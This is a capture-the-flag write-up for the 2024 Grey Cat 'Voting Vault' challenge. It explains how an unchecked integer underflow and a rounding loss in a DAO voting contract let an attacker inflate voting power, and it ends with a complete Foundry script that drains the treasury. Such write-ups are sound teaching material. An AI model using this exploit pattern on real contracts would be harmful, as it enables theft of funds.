---
title: Blockchain - Voting Vault
description: 2024 | Grey Cat The Flag | Blockchain
tags:
    - smart contract
    - double spending
    - precision loss
    - integer underflow
---

## Description

In the spirit of decentralization, GreyHats is now a DAO! Vote with your GREY tokens to decide how our funds are spent.

> nc challs.nusgreyhats.org 30401

> [Challenge Files](https://github.com/MiloTruck/evm-ctf-challenges/tree/8763f5fd12c3179227ec9cac0b21b959c6144dca/src/voting-vault)

## Solution

- 10,000 GREY is deposited into the treasury. To solve the challenge, we need to drain the treasury by creating a withdrawal proposal and gathering enough votes to execute it
- Votes can be obtained by locking GREY for at least 30 days. The voting power can be transferred to others through `VotingVault::delegate()`, and can be done any number of times

    ```js
    function delegate(address newDelegatee) external {
        require(newDelegatee != address(0), "cannot delegate to zero address");

        (UserData storage data, address delegatee) = _getUserData(msg.sender);
        Deposit[] storage deposits = data.deposits;

        data.delegatee = newDelegatee;

        uint256 length = deposits.length;
        if (length == 0) return;

        Deposit storage lastUnlockedDeposit = deposits[data.front];
        Deposit storage lastDeposit = deposits[length - 1];
        uint256 amount = lastDeposit.cumulativeAmount - lastUnlockedDeposit.cumulativeAmount;
        
        uint256 votes = _calculateVotes(amount);
        _subtractVotingPower(delegatee, votes);
        _addVotingPower(newDelegatee, votes);
    }
    ```

- Each person can only vote once for each proposal, but the voting power is reusable. The intuitive idea is to transfer the voting power to other accounts and double spend the votes

    ```js
    function vote(uint256 proposalId) external {
        require(!voted[proposalId][msg.sender], "already voted");

        uint256 blockNumber = proposals[proposalId].blockNumber;
        require(blockNumber < block.number, "same block");
        
        voted[proposalId][msg.sender] = true;

        uint256 votingPower = VAULT.votingPower(msg.sender, blockNumber);
        proposals[proposalId].votes += votingPower;
    }
    ```

- The minimum number of votes required to execute a withdrawal proposal is 1,000,000, while the maximum number of votes we can obtain by locking GREY is 1,300. Due to the limitation of `vote()` function, which only obtains the historical voting power of the previous block, we can only vote once in each block. It is infeasible to reach the threshold and execute the proposal within the validity period of the instance
- When changing the delegatee, the voting power of the previous delegatee will be subtracted. However, the calculation is done within an unchecked block. If `votes` is larger than `oldVotes`, an integer underflow could occur leading to a significant increase in the voting power of the old delegatee

    ```js
    function _subtractVotingPower(address delegatee, uint256 votes) internal {
        uint256 oldVotes = history.getLatestVotingPower(delegatee);
        unchecked { 
            history.push(delegatee, oldVotes - votes); 
        }
    }
    ```

- The number of votes a user receives when locking GREY is calculated based on the amount of GREY being locked. However, when updating the delegatee, the number of transferred votes is calculated based on the **total number** of locked GREY

    ```js
    function lock(uint256 amount) external returns (uint256) {
        ...
        uint256 votes = _calculateVotes(amount);
        _addVotingPower(delegatee, votes);
        GREY.transferFrom(msg.sender, address(this), amount);
        ...
    }

    function delegate(address newDelegatee) external {
        ...
        Deposit storage lastUnlockedDeposit = deposits[data.front];
        Deposit storage lastDeposit = deposits[length - 1];
        uint256 amount = lastDeposit.cumulativeAmount - lastUnlockedDeposit.cumulativeAmount;
        
        uint256 votes = _calculateVotes(amount);
        _subtractVotingPower(delegatee, votes);
        _addVotingPower(newDelegatee, votes);
    }
    ```

- There is a potential loss of precision when calculating votes. Specifically, the number of votes calculated based on the total number of locked GREY could be greater than the number of votes obtained by locking the same amount of GREY several times

    ```js
    function _calculateVotes(uint256 amount) internal pure returns (uint256) {
        return amount * VOTE_MULTIPLIER / 1e18;
    }
    ```

### Exploitation

```js
// forge script Solve --broadcast -vvv --rpc-url $RPC_URL --slow
contract Solve is Script {
    function run() public {
        Setup setup = Setup(vm.envAddress("INSTANCE"));
        uint priv = vm.envUint("PRIV");

        GREY grey = setup.grey();
        VotingVault vault = setup.vault();
        Treasury treasury = setup.treasury();
        
        vm.startBroadcast(priv);
        setup.claim();
        grey.approve(address(vault), 10);
        vault.lock(1);
        vault.lock(9);

        treasury.propose(address(grey), 10000 ether, vm.addr(priv));

        vault.delegate(address(0x1337));
        vm.roll(block.number + 1);  // to pass the local simulation
        treasury.vote(0);

        treasury.execute(0);
        require(setup.isSolved());
        vm.stopBroadcast();
    }
}
```

### Flag

> grey{rounding_is_dangerous_752aa6bb8b6a9f61}
